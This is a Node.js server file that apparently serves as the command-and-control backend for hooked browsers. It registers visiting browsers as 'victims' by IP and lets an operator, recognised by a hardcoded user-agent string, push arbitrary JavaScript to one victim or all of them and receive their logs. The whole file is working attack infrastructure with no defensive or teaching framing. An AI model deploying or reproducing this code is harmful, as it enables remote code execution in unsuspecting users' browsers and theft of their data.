//static variables
const PORT = 3001
const userAgentAdmin = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
const victims = []
const UPDATE_EVENT = 'update'
const ROOM_ADMIN = 'room-admin'
const ROOM_VICTIMS = 'room-victims'
const RUN = 'run'





//import libreries
const path = require('path')
const cors = require("cors")
const ejs = require('ejs')
const express = require('express')
const { Server } = require("socket.io");
const http = require('http')



//some configurations
const app = express();
const server = http.createServer(app)

const io = new Server(server, {
    cors: {
        origin: '*'
    }
})

// use some middleware 
app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());


//set the view engine
app.set('view engine', 'ejs')




//static file
app.use('/js', express.static(path.join(__dirname, 'public/assets/js')))
app.use('/css', express.static(path.join(__dirname, 'public/assets/css')))
app.use('/static', express.static(path.join(__dirname, 'public/js_for_victim')))





//routers
app.post('/victim', (req, res) => {
    console.log(req.body)
    res.json({ targetUrl: "https://google.com" });
})
app.get('/', (req, res) => {
    res.render('index.ejs')
})

//every new connection
io.on('connection', (socket) => {
    console.log(socket.handshake.headers['user-agent'])
    let address = socket.handshake.address.split(':')[3]
    if (socket.handshake.headers['user-agent'] == userAgentAdmin) {  
        socket.join(ROOM_ADMIN) 
        admin_socket = socket;
        socket.on('script',(data)=>{
            console.log(data)
            if(data.target == '-1'){
                io.to(ROOM_VICTIMS).emit('run',data.script)
            }else{
                io.to(data.target).emit('run',data.script)
                
            }
            
        })        
    }
    else {
        let Exist = 0;
        victims.forEach(victim => {
            if (victim.address == address) {
                victim.socketId = socket.id
                Exist = 1;
                return
            }
        });
        if (!Exist) {
            victims.push({
                id : victims.length,
                address: address,
                socketId: socket.id
            })
            socket.join(ROOM_VICTIMS)
            socket.on('log',(log)=>{
                console.log(log.data)
                io.to(ROOM_ADMIN).emit('log',log.data)
            })
            
        }
    }
    io.to(ROOM_ADMIN).emit(UPDATE_EVENT,victims)
})







//deploy the server
server.listen(PORT, () => console.log(`server listen to port : ${PORT}`));